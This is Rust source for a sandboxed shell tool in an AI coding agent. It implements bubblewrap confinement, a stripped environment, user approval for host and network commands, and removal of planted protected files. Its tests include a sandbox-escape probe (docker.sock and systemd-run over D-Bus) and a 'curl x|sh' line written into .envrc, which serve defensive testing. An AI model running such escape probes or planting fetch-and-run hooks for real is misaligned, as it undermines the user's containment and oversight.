//! `bash`: run a shell command in the project folder, in the sandbox.
//!
//! Ports Marv's `src/tools/bash.ts`. The sandbox (bwrap arguments, `.git` guard, notes) is marv-sandbox.
//!
//! - stdout and stderr combined in order (`exec 2>&1` before the command); both pipes read at once so neither fills
//!   and blocks; at most [`MAX_CAPTURE`] = 2M chars kept in memory; the model sees 30k (10k head + 20k tail,
//!   [`crate::output`]) and how it ended (`[exit code N]`, `[timed out after Ns]`, `[stopped by the user]`).
//! - If bwrap itself fails to start the sandbox, its stderr is shown as `[sandbox failed to start: …]` instead of
//!   empty output.
//! - Timeout default 120 s, max 600 s ([`MAX_TIMEOUT_S`]); a timeout given in milliseconds is repaired (issue #10).
//! - Sandboxed: bwrap, killed with SIGKILL (it takes its PID namespace down with it). Not sandboxed: in a process
//!   group of its own (Marv: `setsid`; here `process_group(0)`, same effect), so a timeout or ctrl+c kills everything
//!   it started; still a minimal environment (no API keys).
//! - Confined (yolo): `.git` read-only or an empty placeholder (`git_guard`; the placeholder's mount point is
//!   `rmdir`ed afterwards). A confined command that fails on the read-only `.git` gets `GIT_HINT`. An approved command
//!   in a worktree gets the checked worktree folders writable, except folders the caller made read-only.
//! - Notes after the output: the stand-in home (`touches_hidden_home`), the missing network (not for 126/127; a
//!   timeout counts) and, for `gh`, the GitHub MCP server instead (#23, #27).
//! - Scope `bash:[net:][git:]<command>` ("this exact command"); `auto_safe` only sandboxed, without network or
//!   `git_write`. The description tells the model not to write files with heredocs: a model put the terminator on the
//!   same line as `&& …`, read bash's warning as truncation, and retried for 10 steps.
//! - marv-rs: protected files (docs/SECURITY.md). Existing ones are mounted read-only by the sandbox at any level; a
//!   command that runs without asking also sees nested `.git` folders read-only. bwrap can only mount what exists, so
//!   a sandboxed command's *new* protected files (a `.envrc`, a nested `AGENTS.md`) are found by a scan after it
//!   (`protected_snapshot` before, `scan_created` after the placeholders are gone), removed and reported in a
//!   `Marv:` note. A new `.git` is kept when the user approved a `git_write` command (`git init`, a submodule).
//! - marv-rs: `uses_network` calls ask after taint even in yolo; the approval for a network command will list the
//!   scripts written this session that the command runs (docs/SECURITY.md).

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::LazyLock;
use std::time::Duration;

use async_trait::async_trait;
use serde::Deserialize;
use serde_json::{Value, json};
use tokio::io::{AsyncRead, AsyncReadExt};

use marv_sandbox::git_guard::{GitGuard, git_guard, worktree_git};
use marv_sandbox::notes::{
    BACKGROUND_NOTE, BACKGROUND_NOTE_PROCESS, GH_NOTE, GH_TOOL_NOTE, GIT_HINT, HOME_NOTE, NETWORK_NOTE, backgrounds_process,
    looks_like_network_failure, runs_gh, touches_hidden_home,
};
use marv_sandbox::paths::is_inside;
use marv_sandbox::protected::{ProtectedRule, created_note, nested_git_dirs, protected_snapshot, revert_created, scan_created};

use crate::github::redact::{redact, redacted_note};
use crate::output::cut_for_model;
use crate::repair::repair_timeout_field;
use crate::types::{Door, Preview, Repaired, Scope, Tool, ToolContext, ToolError, ToolOutput};

pub const DEFAULT_TIMEOUT_S: u64 = 120;
pub const MAX_TIMEOUT_S: u64 = 600;
/// Kept in memory per command; anything beyond is dropped (the middle is cut for the model anyway).
pub const MAX_CAPTURE: usize = 2_000_000;

/// How a command ended.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CommandResult {
    pub output: String,
    /// None when the command was killed.
    pub exit_code: Option<i32>,
    pub timed_out: bool,
    pub aborted: bool,
    pub timeout: Option<Duration>,
}

/// One command to run.
#[derive(Debug, Clone, Default)]
pub struct RunOptions {
    pub command: String,
    pub root: PathBuf,
    pub sandbox: bool,
    pub network: bool,
    pub timeout: Duration,
    pub read_only: Vec<PathBuf>,
    pub writable: Vec<PathBuf>,
    pub placeholders: Vec<PathBuf>,
    pub project_read_only: bool,
    /// Not sandboxed: this environment instead of the minimal one (the host door's, `host_env`).
    pub env: Option<std::collections::BTreeMap<String, String>>,
    /// Sandboxed, without network: the background processes' forwarded ports (Marv #51), each reached through its
    /// socket folder, mounted read-only at `/run/marv/<id>`; a relay listens on the sandbox's 127.0.0.1:<port> for each.
    pub forwards: Vec<crate::types::ProcessForward>,
}

/// The relay in front of a sandboxed command without network while processes run (Marv #51): their socket folders
/// and Marv's binary mounted, and the command run by `marv __relay`. With network the sandbox shares the host's
/// 127.0.0.1, where the ports are forwarded already. None: the command runs as it is.
fn relay_for(
    forwards: &[crate::types::ProcessForward],
    script: &str,
) -> Option<(Vec<marv_sandbox::Bind>, Vec<std::ffi::OsString>)> {
    use crate::relay::{RelayForward, RelaySpec, SOCKET_DIR, SOCKET_NAME};
    if forwards.is_empty() {
        return None;
    }
    let mut binds = vec![crate::relay::exe_bind()?];
    for forward in forwards {
        let dest = PathBuf::from(format!("{SOCKET_DIR}/{}", forward.id));
        if !binds.iter().any(|b| b.dest == dest) {
            binds.push(marv_sandbox::Bind { source: forward.dir.clone(), dest, writable: false });
        }
    }
    let connect =
        forwards.iter().map(|f| RelayForward { port: f.port, socket: format!("{SOCKET_DIR}/{}/{SOCKET_NAME}", f.id) }).collect();
    let spec = RelaySpec { listen: None, connect, argv: vec!["bash".into(), "-c".into(), script.into()] };
    Some((binds, crate::relay::sandbox_argv(&spec)))
}

/// Runs a shell command in the project folder with stdout and stderr combined (also used by diagnostics and checks).
/// Sandboxed: inside bwrap (`marv_sandbox::Sandbox::command`). Not sandboxed: still with a minimal environment, so
/// API keys don't leak into commands. `sandbox` gives the home folder, `PATH` and `LANG` (tests pass a fake home).
pub async fn run_command(
    options: RunOptions,
    sandbox: &marv_sandbox::Sandbox,
    cancel: &tokio_util::sync::CancellationToken,
) -> CommandResult {
    let RunOptions {
        command,
        root,
        sandbox: sandboxed,
        network,
        timeout,
        read_only,
        writable,
        placeholders,
        project_read_only,
        env,
        forwards,
    } = options;
    let started = |output: String| CommandResult { output, exit_code: None, timeout: Some(timeout), ..Default::default() };
    let script = format!("exec 2>&1\n{command}"); // stderr into stdout, so the output stays in order
    let mut cmd = if sandboxed {
        let relay = if network { None } else { relay_for(&forwards, &script) };
        let mut mounts =
            marv_sandbox::CommandMounts { network, read_only, writable, placeholders, project_read_only, binds: vec![] };
        let argv = match relay {
            Some((binds, inner)) => {
                mounts.binds = binds;
                sandbox.command_argv(&root, &mounts, &inner)
            }
            None => sandbox.command(&root, &mounts, &script),
        };
        let argv = match argv {
            Ok(argv) => argv,
            // A mount that can't be made safely: the command never starts, and the model is told why.
            Err(e) => return started(format!("[sandbox failed to start: {e}]\n")),
        };
        let mut cmd = tokio::process::Command::new(&argv[0]);
        cmd.args(&argv[1..]).env_clear().env("PATH", &sandbox.path);
        cmd
    } else {
        let mut cmd = tokio::process::Command::new("bash");
        cmd.arg("-c").arg(&script).env_clear();
        match env {
            Some(env) => cmd.envs(env),
            None => cmd.env("PATH", &sandbox.path).env("HOME", &sandbox.home).env("LANG", &sandbox.lang).env("TERM", "dumb"),
        };
        // Its own process group, so killing it also kills everything it started.
        cmd.process_group(0);
        cmd
    };
    cmd.current_dir(&root)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        // The command's own stderr goes to stdout (`exec 2>&1`), so only what comes before it lands here: bwrap's
        // own errors, e.g. when it can't set the sandbox up.
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => return started(format!("[couldn't start the command: {e}]\n")),
    };
    let pid = child.id();
    let (Some(stdout), Some(stderr)) = (child.stdout.take(), child.stderr.take()) else {
        return started("[couldn't start the command: no output pipes]\n".into());
    };

    let kill = |child: &mut tokio::process::Child| {
        match pid {
            Some(pid) if !sandboxed => {
                let group = nix::unistd::Pid::from_raw(pid as i32);
                let _ = nix::sys::signal::killpg(group, nix::sys::signal::Signal::SIGKILL);
            }
            // bwrap takes its whole sandbox down with it.
            _ => {
                let _ = child.start_kill();
            }
        }
    };
    // Both at once, so neither pipe fills up and blocks the other.
    let io = async { tokio::join!(capture(stdout), capture(stderr)) };
    tokio::pin!(io);
    let deadline = tokio::time::sleep(timeout);
    tokio::pin!(deadline);
    let (mut timed_out, mut aborted) = (false, false);
    let (output, errors) = loop {
        tokio::select! {
            out = &mut io => break out,
            () = &mut deadline, if !timed_out && !aborted => {
                timed_out = true;
                kill(&mut child);
            }
            () = cancel.cancelled(), if !timed_out && !aborted => {
                aborted = true;
                kill(&mut child);
            }
        }
    };
    // The pipes can close long before the command ends (`exec >/dev/null 2>&1; sleep 60`): the timeout and the stop
    // stay armed until it has exited, or such a command would hold the turn (or a hook) past its timeout.
    let status = loop {
        if timed_out || aborted {
            break child.wait().await.ok();
        }
        tokio::select! {
            status = child.wait() => break status.ok(),
            () = &mut deadline => timed_out = true,
            () = cancel.cancelled() => aborted = true,
        }
        kill(&mut child);
    };
    let exit_code = if timed_out || aborted { None } else { status.and_then(|s| s.code()) };
    let mut output = output;
    // Without this, a sandbox that never started looks like a command that silently failed.
    if sandboxed && exit_code.is_some_and(|c| c != 0) && output.trim().is_empty() && !errors.trim().is_empty() {
        output = format!("[sandbox failed to start: {}]\n", errors.trim());
    }
    CommandResult { output, exit_code, timed_out, aborted, timeout: Some(timeout) }
}

/// A stream's text, up to about [`MAX_CAPTURE`] (whole chunks are kept while under it; the rest is read and dropped).
pub(crate) async fn capture(mut stream: impl AsyncRead + Unpin) -> String {
    let mut kept = Vec::new();
    let mut chunk = vec![0u8; 64 * 1024];
    loop {
        match stream.read(&mut chunk).await {
            Ok(0) | Err(_) => break,
            Ok(n) if kept.len() < MAX_CAPTURE => kept.extend_from_slice(&chunk[..n]),
            Ok(_) => {}
        }
    }
    String::from_utf8_lossy(&kept).into_owned()
}

/// The real path, or the path itself when it doesn't resolve.
fn real_or_self(path: &Path) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
}

/// A confined command that failed on the read-only `.git`.
static GIT_READ_ONLY: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"\.git\b.*Read-only file system").unwrap());

/// The command's result as the model sees it: output (start and end if long), then how it ended.
pub fn format_output(result: &CommandResult) -> String {
    let trimmed = result.output.trim_end();
    let text = if result.output.trim().is_empty() { "(no output)".to_string() } else { cut_for_model(trimmed) };
    let ending = if result.timed_out {
        // Math.round(ms / 1000), as Marv.
        format!("[timed out after {}s]", result.timeout.map_or(0, |t| (t.as_millis() + 500) / 1000))
    } else if result.aborted {
        "[stopped by the user]".to_string()
    } else {
        format!("[exit code {}]", result.exit_code.map_or("null".to_string(), |c| c.to_string()))
    };
    format!("{text}\n\n{ending}")
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct BashInput {
    pub command: String,
    pub timeout: Option<u64>,
    pub network: Option<bool>,
    pub git_write: Option<bool>,
    /// `false`: the host door (#52), one command on the user's machine. In the spec for every session (one bash spec:
    /// the prompt cache); refused in preview where the door is closed.
    pub sandbox: Option<bool>,
}

/// Said when a call asks for the host where no one approves each command (marv -p, the SDK without hostCommands,
/// subagents).
pub const NO_HOST_DOOR: &str = "Commands outside the sandbox can only run in Marv's terminal, with the user approving each one.";
/// Added to the network and hidden-home notes where the host door is open: the last resort, which asks.
const HOST_LAST_RESORT: &str =
    "If this can't work in the sandbox at all, bash with sandbox: false asks the user to run it on their machine.";

/// Whether a call goes through the host door: it says sandbox: false where the sandbox is on and works. With the
/// sandbox already off (/sandbox off, or no bubblewrap) the flag changes nothing: the call is an ordinary one.
fn through_host(input: &BashInput, ctx: &ToolContext) -> bool {
    input.sandbox == Some(false) && ctx.sandbox.active()
}

/// A few words on how a command ended, for the transcript.
fn command_summary(result: &CommandResult, timeout: u64) -> String {
    let trimmed = result.output.trim_end();
    let lines = if trimmed.is_empty() { 0 } else { trimmed.split('\n').count() };
    if result.timed_out {
        format!("timed out after {timeout}s")
    } else if result.aborted {
        "stopped".to_string()
    } else {
        let code = result.exit_code.map_or("null".to_string(), |c| c.to_string());
        let output =
            if lines > 0 { format!(" · {lines} line{} of output", if lines == 1 { "" } else { "s" }) } else { String::new() };
        format!("exit {code}{output}")
    }
}

pub struct Bash;

#[async_trait]
impl Tool for Bash {
    type Input = BashInput;

    fn name(&self) -> &str {
        "bash"
    }
    fn description(&self) -> &str {
        "Run a shell command in the project folder, e.g. to run tests, a build, git status, or wc -l. It runs in a sandbox: only the project folder is writable, the home folder is an empty stand-in (toolchains like ~/.bun, ~/.local/share/mise, ~/.asdf, git config and ~/.marv/skills show through, read-only; nothing else in it is visible), and there's no network unless you set network: true. The user may be asked to approve a command; they always are for network: true or git_write: true. Not interactive: commands can't prompt for input. Don't write files with it (no heredocs or echo >): use write_file or edit_file. Output (stdout and stderr together) is cut in the middle if very long."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "command": {"type": "string", "minLength": 1, "description": "The shell command (bash). Runs in the project folder."},
                "timeout": {"type": "integer", "minimum": 1, "maximum": MAX_TIMEOUT_S, "description": format!("Seconds before it's stopped. Default {DEFAULT_TIMEOUT_S}.")},
                "network": {"type": "boolean", "description": "Allow network access (e.g. to install packages). Off by default."},
                "git_write": {"type": "boolean", "description": "Set when the command changes the git repository (commit, checkout, merge, rebase, stash, branch, tag, init…). Otherwise .git may be read-only."},
                "sandbox": {"type": "boolean", "description": "false runs the command on the user's machine, outside the sandbox, with their permissions; always asks. Only for what can't work in the sandbox (a system service, a tool under the home folder, hardware), after a sandboxed attempt failed."}
            },
            "required": ["command"],
            "additionalProperties": false
        })
    }
    fn kind(&self) -> marv_core::ToolKind {
        marv_core::ToolKind::Execute
    }
    fn check(&self, input: &BashInput) -> Result<(), String> {
        if input.command.is_empty() {
            return Err("command: must not be empty".into());
        }
        if input.timeout.is_some_and(|t| !(1..=MAX_TIMEOUT_S).contains(&t)) {
            return Err(format!("timeout: must be between 1 and {MAX_TIMEOUT_S}"));
        }
        Ok(())
    }
    fn label(&self, input: &BashInput) -> String {
        input.command.clone()
    }
    fn uses_network(&self, input: &BashInput) -> bool {
        input.network.unwrap_or(false)
    }
    fn uses_network_in(&self, input: &BashInput, ctx: &ToolContext) -> bool {
        input.network.unwrap_or(false) || through_host(input, ctx)
    }
    fn scope(&self, input: &BashInput) -> Option<Scope> {
        let net = if input.network.unwrap_or(false) { "net:" } else { "" };
        let git = if input.git_write.unwrap_or(false) { "git:" } else { "" };
        Some(Scope { key: format!("bash:{net}{git}{}", input.command), description: "this exact command".into() })
    }
    /// On the host, network and git_write mean nothing (it has both): one key, never remembered (`once`).
    fn scope_in(&self, input: &BashInput, ctx: &ToolContext) -> Option<Scope> {
        if through_host(input, ctx) {
            return Some(Scope {
                key: format!("bash:host:{}", input.command),
                description: "this exact command on your machine".into(),
            });
        }
        self.scope(input)
    }
    fn door(&self, input: &BashInput, ctx: &ToolContext) -> Option<Door> {
        through_host(input, ctx).then_some(Door::Host)
    }
    fn once(&self, input: &BashInput, ctx: &ToolContext) -> bool {
        through_host(input, ctx)
    }
    /// In the sandbox, without network, and (as run_tool confines it) with .git read-only, a command can only change
    /// the project's own files. Without the sandbox, nothing limits it; on the host, everything is in reach.
    fn auto_safe(&self, input: &BashInput, ctx: &ToolContext) -> bool {
        ctx.sandbox.active()
            && !input.network.unwrap_or(false)
            && !input.git_write.unwrap_or(false)
            && input.sandbox != Some(false)
    }
    fn repair(&self, raw: &Value, _ctx: &ToolContext) -> Option<Repaired> {
        repair_timeout_field(raw, MAX_TIMEOUT_S)
    }

    async fn preview(&self, input: &BashInput, ctx: &ToolContext) -> Result<Preview, ToolError> {
        if through_host(input, ctx) {
            // Refused before any ask where no one approves each command: an approver can be told to say yes to an
            // exact scope key (marv -p --approve), so the door is the context's to open, not the approver's.
            if !ctx.doors.host {
                return Err(ToolError::new(NO_HOST_DOOR));
            }
            // The warning line is the door's (ApprovalRequest::door), so it's the same wherever the request is shown.
            let timeout = input.timeout.map(|t| format!(" · timeout {t}s")).unwrap_or_default();
            return Ok(Preview {
                title: "Run a command on your machine".into(),
                command: Some(input.command.clone()),
                note: Some(format!("asked every time{timeout}")),
                ..Default::default()
            });
        }
        let sandboxed = ctx.sandbox.active();
        let mut notes = Vec::new();
        if sandboxed {
            notes.push("sandboxed".to_string());
            notes.push(if input.network.unwrap_or(false) { "network allowed" } else { "no network" }.to_string());
        }
        if let Some(t) = input.timeout {
            notes.push(format!("timeout {t}s"));
        }
        let warning = if sandboxed {
            None
        } else if ctx.sandbox.enabled {
            Some("bubblewrap isn't available here, so this runs WITHOUT a sandbox".to_string())
        } else {
            Some("the sandbox is off (/sandbox on to turn it back on), so this runs WITHOUT a sandbox".to_string())
        };
        Ok(Preview {
            title: "Run a command".into(),
            command: Some(input.command.clone()),
            note: (!notes.is_empty()).then(|| notes.join(" · ")),
            warning,
            ..Default::default()
        })
    }

    async fn run(&self, input: &BashInput, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        let network = input.network.unwrap_or(false);
        let timeout = input.timeout.unwrap_or(DEFAULT_TIMEOUT_S);
        if through_host(input, ctx) {
            // Checked again here, so no path to run() skips the door (preview refuses first).
            if !ctx.doors.host {
                return Err(ToolError::new(NO_HOST_DOOR));
            }
            let options = RunOptions {
                command: input.command.clone(),
                root: ctx.root.clone(),
                network: true,
                timeout: Duration::from_secs(timeout),
                env: Some(marv_sandbox::host_env::host_env_now()),
                ..Default::default()
            };
            let result = run_command(options, &ctx.sandbox, &ctx.cancel).await;
            // A second line behind host_env's filter, for GitHub's token shapes only (redact()): other secrets a
            // command prints itself aren't caught, which is why each host command is shown and asked first.
            let shown = redact(&format_output(&result));
            let note = if shown.count > 0 { format!("\n{}", redacted_note(shown.count)) } else { String::new() };
            let redacted = if shown.count > 0 { format!(" · {} redacted", shown.count) } else { String::new() };
            let summary = format!("{} · on your machine{redacted}", command_summary(&result, timeout));
            return Ok(ToolOutput::ok(shown.text + &note, summary));
        }
        // A command that runs without asking sees .git read-only: git runs hooks and config from it outside any
        // sandbox (the user's next commit, their editor), so a planted hook would escape. Without a .git, it can't
        // create one either (an empty read-only placeholder sits there), or `git status` in that folder would run its
        // config.
        let guard = if ctx.confined { git_guard(&ctx.root) } else { GitGuard::default() };
        // An approved command (yolo off, git_write, network) in a git worktree: it may change the repository like any
        // approved command may change a .git inside the project, but it has to see it first. The same check as above
        // decides whether the worktree's records are trusted. A folder the caller made read-only stays that way: a
        // worktree subagent's shared .git is read-only even for its approved commands.
        let kept: Vec<PathBuf> = ctx.read_only.iter().map(|d| real_or_self(d)).collect();
        let approved_git: Vec<PathBuf> = if ctx.confined {
            Vec::new()
        } else {
            worktree_git(&ctx.root).into_iter().filter(|dir| !kept.iter().any(|ro| is_inside(ro, &real_or_self(dir)))).collect()
        };
        let sandboxed = ctx.sandbox.active();
        let mut read_only = ctx.read_only.clone();
        read_only.extend(guard.read_only);
        // A vendored repository's .git runs its config and hooks when the user works there, like the project's own.
        if ctx.confined && sandboxed {
            read_only.extend(nested_git_dirs(&ctx.root));
        }
        // What's protected now, to find what the command adds (bwrap can only mount what exists).
        let before = sandboxed.then(|| protected_snapshot(&ctx.root));
        let options = RunOptions {
            command: input.command.clone(),
            root: ctx.root.clone(),
            sandbox: sandboxed,
            network,
            timeout: Duration::from_secs(timeout),
            read_only,
            writable: approved_git,
            placeholders: guard.placeholders.clone(),
            project_read_only: false,
            env: None,
            forwards: ctx.forwards.as_ref().map(|f| f.forwards()).unwrap_or_default(),
        };
        let mut result = run_command(options, &ctx.sandbox, &ctx.cancel).await;
        // bwrap leaves a placeholder's empty mount point; remove_dir only removes it while it's empty.
        for path in &guard.placeholders {
            let _ = tokio::fs::remove_dir(path).await;
        }
        // After the placeholders are gone: an empty .git mount point left behind would read as created.
        if let Some(before) = &before {
            let mut created = scan_created(&ctx.root, before);
            // A repository an approved git_write command made (`git init`, a submodule) is the user's to keep.
            if input.git_write.unwrap_or(false) && !ctx.confined {
                created.retain(|c| c.rule != ProtectedRule::GitDir);
            }
            revert_created(&ctx.root, &mut created);
            if let Some(note) = created_note(&created) {
                result.output.push_str(&format!("\n{note}\n"));
            }
        }
        if ctx.confined && GIT_READ_ONLY.is_match(&result.output) {
            result.output.push_str(&format!("\n{GIT_HINT}\n"));
        }
        let summary = command_summary(&result, timeout);
        let last_resort = if ctx.doors.host { format!(" {HOST_LAST_RESORT}") } else { String::new() };
        if sandboxed && touches_hidden_home(&input.command, &ctx.root, &ctx.sandbox.home) {
            result.output.push_str(&format!("\n{HOME_NOTE}{last_resort}\n"));
        }
        // Everything a command backgrounds dies with it (Marv #50); with the process door, that's the way instead (#51).
        if sandboxed && backgrounds_process(&input.command) {
            let note = if ctx.doors.process { BACKGROUND_NOTE_PROCESS } else { BACKGROUND_NOTE };
            result.output.push_str(&format!("\n{note}\n"));
        }
        // Not for a command that isn't there (127) or can't run (126): the network has nothing to do with those.
        let failed = result.timed_out || (!result.aborted && !matches!(result.exit_code, Some(0 | 126 | 127)));
        if sandboxed && !network && failed && looks_like_network_failure(&input.command, &result.output) {
            result.output.push_str(&format!("\n{NETWORK_NOTE}{last_resort}\n"));
            // A gh failure usually isn't the network, and the missing network isn't the fix: the MCP server is (#27).
            // gh is a network command, so the note above is already there for it; this adds what to do instead. Where
            // the session has the github tool (#47), that's the way instead.
            if runs_gh(&input.command) {
                let gh = if ctx.doors.github { GH_TOOL_NOTE } else { GH_NOTE };
                result.output.push_str(&format!("\n{gh}\n"));
            }
        }
        Ok(ToolOutput::ok(format_output(&result), summary))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn result(output: &str, exit_code: Option<i32>) -> CommandResult {
        CommandResult { output: output.into(), exit_code, ..Default::default() }
    }

    #[test]
    fn shows_the_output_and_exit_code() {
        assert_eq!(format_output(&result("ok\n", Some(0))), "ok\n\n[exit code 0]");
        assert_eq!(format_output(&result("", Some(1))), "(no output)\n\n[exit code 1]");
    }

    #[test]
    fn says_when_it_timed_out_or_was_stopped() {
        let timed_out = CommandResult {
            output: "partial".into(),
            timed_out: true,
            timeout: Some(Duration::from_secs(1)),
            ..Default::default()
        };
        assert!(format_output(&timed_out).contains("[timed out after 1s]"));
        let stopped = CommandResult { aborted: true, ..Default::default() };
        assert!(format_output(&stopped).ends_with("[stopped by the user]"));
    }

    use crate::test_support::TempDir;
    use marv_sandbox::{Sandbox, sandbox_available};
    use tokio_util::sync::CancellationToken;

    /// Skips a test that needs bwrap on a machine without it (CI).
    macro_rules! require_bwrap {
        () => {
            if !sandbox_available() {
                eprintln!("skipped: bubblewrap isn't available here");
                return;
            }
        };
    }

    fn options(command: &str, root: &Path) -> RunOptions {
        RunOptions { command: command.into(), root: root.into(), timeout: Duration::from_secs(10), ..Default::default() }
    }
    async fn run(command: &str, root: &Path) -> CommandResult {
        run_command(options(command, root), &Sandbox::from_env(true), &CancellationToken::new()).await
    }
    async fn sandboxed(command: &str, root: &Path) -> CommandResult {
        run_command(RunOptions { sandbox: true, ..options(command, root) }, &Sandbox::from_env(true), &CancellationToken::new())
            .await
    }

    #[tokio::test]
    async fn returns_combined_output_and_the_exit_code() {
        let root = TempDir::new("bash");
        let result = run("echo out; echo err >&2; exit 3", root.path()).await;
        assert_eq!(result.output, "out\nerr\n");
        assert_eq!(result.exit_code, Some(3));
    }

    #[tokio::test]
    async fn runs_in_the_project_folder() {
        let root = TempDir::new("bash-cwd");
        root.write("hello.txt", "hi");
        assert_eq!(run("cat hello.txt", root.path()).await.output, "hi");
    }

    #[tokio::test]
    async fn kills_commands_that_run_too_long_with_everything_they_started() {
        let root = TempDir::new("bash-timeout");
        let first = RunOptions { timeout: Duration::from_millis(200), ..options("sleep 5; echo never", root.path()) };
        let started = std::time::Instant::now();
        let result = run_command(first, &Sandbox::from_env(true), &CancellationToken::new()).await;
        assert!(result.timed_out);
        assert_eq!(result.exit_code, None);
        assert!(!result.output.contains("never"));
        assert!(started.elapsed() < Duration::from_secs(3));
        // A background child holding the pipe open dies with its group too.
        let second = RunOptions { timeout: Duration::from_millis(200), ..options("(sleep 30 &) ; sleep 30", root.path()) };
        let started = std::time::Instant::now();
        assert!(run_command(second, &Sandbox::from_env(true), &CancellationToken::new()).await.timed_out);
        assert!(started.elapsed() < Duration::from_secs(3));
    }

    /// A command that closes its output pipes and keeps running: the timeout still holds, and kills its whole group
    /// (Greptile on #115: `run_command` waited for the child outside its timeout once the pipes had closed).
    const CLOSES_ITS_PIPES: &str = "(sleep 3; touch late) >/dev/null 2>&1 & exec >/dev/null 2>&1; sleep 60";

    async fn times_out_after_closing_its_pipes(sandbox: bool) {
        let root = TempDir::new("bash-closed");
        let options = RunOptions { sandbox, timeout: Duration::from_secs(1), ..options(CLOSES_ITS_PIPES, root.path()) };
        let started = std::time::Instant::now();
        let result = run_command(options, &Sandbox::from_env(true), &CancellationToken::new()).await;
        assert!(result.timed_out && result.exit_code.is_none(), "{result:?}");
        let took = started.elapsed();
        assert!(took >= Duration::from_millis(900) && took < Duration::from_millis(2500), "{took:?}");
        // Its background job was in the group (the sandbox) that died: it never gets to write.
        tokio::time::sleep(Duration::from_millis(3000)).await;
        assert!(!root.path().join("late").exists(), "the command's group outlived its timeout");
    }

    #[tokio::test]
    async fn the_timeout_holds_after_the_command_closes_its_pipes() {
        times_out_after_closing_its_pipes(false).await;
    }

    #[tokio::test]
    async fn the_timeout_holds_after_a_sandboxed_command_closes_its_pipes() {
        require_bwrap!();
        times_out_after_closing_its_pipes(true).await;
    }

    #[tokio::test]
    async fn a_stop_holds_after_the_command_closes_its_pipes() {
        let root = TempDir::new("bash-closed-stop");
        let cancel = CancellationToken::new();
        let stop = cancel.clone();
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(300)).await;
            stop.cancel();
        });
        let started = std::time::Instant::now();
        let options = RunOptions { timeout: Duration::from_secs(60), ..options(CLOSES_ITS_PIPES, root.path()) };
        let result = run_command(options, &Sandbox::from_env(true), &cancel).await;
        assert!(result.aborted && result.exit_code.is_none(), "{result:?}");
        assert!(started.elapsed() < Duration::from_secs(2), "{:?}", started.elapsed());
    }

    #[tokio::test]
    async fn stops_when_aborted() {
        let root = TempDir::new("bash-abort");
        let cancel = CancellationToken::new();
        let stop = cancel.clone();
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(100)).await;
            stop.cancel();
        });
        let started = std::time::Instant::now();
        let result = run_command(options("sleep 5", root.path()), &Sandbox::from_env(true), &cancel).await;
        assert!(started.elapsed() < Duration::from_secs(2));
        assert!(result.aborted);
        assert_eq!(format_output(&result), "(no output)\n\n[stopped by the user]");
    }

    #[tokio::test]
    async fn doesnt_pass_api_keys_through_to_the_command() {
        // The command's environment is built from scratch, never inherited: a key in Marv's environment can't leak.
        let root = TempDir::new("bash-env");
        let result =
            run("echo key=$OPENROUTER_API_KEY home=$HOME term=$TERM; env | cut -d= -f1 | LC_ALL=C sort", root.path()).await;
        let home = Sandbox::from_env(true).home;
        let mut lines = result.output.lines();
        assert_eq!(lines.next(), Some(format!("key= home={} term=dumb", home.display()).as_str()));
        // Marv's four, and what bash sets itself.
        assert_eq!(lines.collect::<Vec<_>>(), ["HOME", "LANG", "PATH", "PWD", "SHLVL", "TERM", "_"]);
    }

    #[tokio::test]
    async fn in_the_sandbox_cant_reach_the_hosts_sockets_under_run() {
        require_bwrap!();
        // A folder on the host, outside the project: the sandbox can't write it, so a file there means a command ran
        // outside (systemd-run over the user's D-Bus starts programs outside).
        let root = TempDir::new("bash-run");
        let outside = TempDir::new("bash-escape");
        let marker = outside.path().join("escaped");
        let result = sandboxed(
            &format!(
                "echo \"run:[$(ls -A /run)]\"; test -e /var/run/docker.sock && echo DOCKER; \
                 XDG_RUNTIME_DIR=/run/user/$(id -u) systemd-run --user --wait --collect --quiet /usr/bin/touch {} 2>&1; echo done",
                marker.display()
            ),
            root.path(),
        )
        .await;
        assert!(result.output.contains("done"), "{}", result.output);
        assert!(!result.output.contains("DOCKER"));
        assert!(result.output.contains("run:[]"), "{}", result.output);
        assert!(!marker.exists());
    }

    fn git_bash(command: &str, git_write: bool) -> BashInput {
        BashInput { command: command.into(), timeout: None, network: None, git_write: Some(git_write), sandbox: None }
    }

    #[tokio::test]
    async fn protected_files_a_command_creates_are_removed_and_reported() {
        require_bwrap!();
        let root = TempDir::new("bash-created");
        root.write("packages/a/AGENTS.md", "rules\n");
        let ctx = ToolContext { confined: true, ..ToolContext::new(root.path()) };
        let out = Bash
            .run(&git_bash("echo 'curl x|sh' > .envrc; mkdir -p b/c; echo obey > b/c/CLAUDE.md; echo more >> packages/a/AGENTS.md; echo ok > src.txt", false), &ctx)
            .await
            .unwrap();
        assert!(!root.path().join(".envrc").exists());
        assert!(!root.path().join("b/c/CLAUDE.md").exists());
        assert_eq!(std::fs::read_to_string(root.path().join("packages/a/AGENTS.md")).unwrap(), "rules\n"); // read-only
        assert_eq!(std::fs::read_to_string(root.path().join("src.txt")).unwrap(), "ok\n");
        assert!(out.output.contains("Marv: the command created protected files, which were removed: .envrc ("), "{}", out.output);
        assert!(out.output.contains("b/c/CLAUDE.md"));
        // Nothing created, no note; the .git placeholder bwrap left behind isn't taken for a new repository.
        let quiet = Bash.run(&git_bash("echo hi", false), &ctx).await.unwrap();
        assert!(!quiet.output.contains("Marv:"), "{}", quiet.output);
        assert!(!root.path().join(".git").exists());
    }

    #[tokio::test]
    async fn an_approved_git_write_keeps_its_new_repository_and_confined_commands_see_nested_git_read_only() {
        require_bwrap!();
        let root = TempDir::new("bash-git");
        let approved = ToolContext::new(root.path());
        let out =
            Bash.run(&git_bash("mkdir -p vendor/x/.git && echo '[core]' > vendor/x/.git/config", true), &approved).await.unwrap();
        assert!(root.path().join("vendor/x/.git/config").exists(), "{}", out.output);
        // Without asking, a vendored repository's .git is read-only.
